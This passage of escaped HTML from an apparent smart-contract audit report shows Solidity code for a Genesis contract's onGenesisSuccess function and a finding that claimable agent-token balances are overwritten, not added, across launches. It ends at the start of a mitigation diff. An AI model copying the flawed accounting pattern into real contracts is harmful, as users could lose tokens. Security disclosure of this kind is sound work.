class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisFirstLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// grant allowance to agentFactoryAddress for launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactoryAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserveAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call initFromBondingCurve and executeBondingCurveApplication\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactoryAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitFromBondingCurve\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econcat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisName\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot; by Virtuals\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisTicker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisCores\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaSalt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etbaImplementation\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoVotingPeriod\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edaoThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserveAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecreator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactoryAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteBondingCurveApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenLpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// vault\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Agent token creation failed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Store the created agent token address\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Calculate total distribution amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalDistributionAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalDistributionAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if contract has enough agent token balance only after agentTokenAddress be set\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalDistributionAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient Agent Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Directly transfer Virtual Token refunds\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// first decrease the virtuals mapping of the user to prevent reentrancy attacks\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emapAddrToVirtuals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]] -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// then transfer the virtuals\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eRefundClaimed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// save the amount of agent tokens to claim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;          \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimableAgentTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]; \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eGenesisSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egenesisId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eMultiple launches can occur, which is why the \u003ccode\u003eisFirstLaunch\u003c/code\u003e flag is implemented. However, there’s an issue in how \u003ccode\u003eagentTokens\u003c/code\u003e are accounted for in the \u003ccode\u003eclaimableAgentTokens\u003c/code\u003e mapping.\u003c/p\u003e\n\u003cp\u003eCurrently, the mapping value is being overwritten instead of incremented. This means if a user doesn’t call \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L307-L318\"\u003e\u003ccode\u003eclaimAgentToken()\u003c/code\u003e\u003c/a\u003e to redeem their \u003ccode\u003eagentTokens\u003c/code\u003e before a subsequent launch occurs, the second launch will overwrite the previous value resulting in a loss of \u003ccode\u003eagentTokens\u003c/code\u003e from the first launch.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo resolve the issue, update the logic to \u003cstrong\u003eadd\u003c/strong\u003e the new \u003ccode\u003eagentTokens\u003c/code\u003e amount instead of \u003cstrong\u003eoverwriting\u003c/strong\u003e it.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"101\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction onGenesisSuccess(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address[] calldata refundVirtualsTokenUserAddresses,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256[] calldata refundVirtualsTokenUserAmounts,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address[] calldata distributeAgentTokenUserAddresses,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 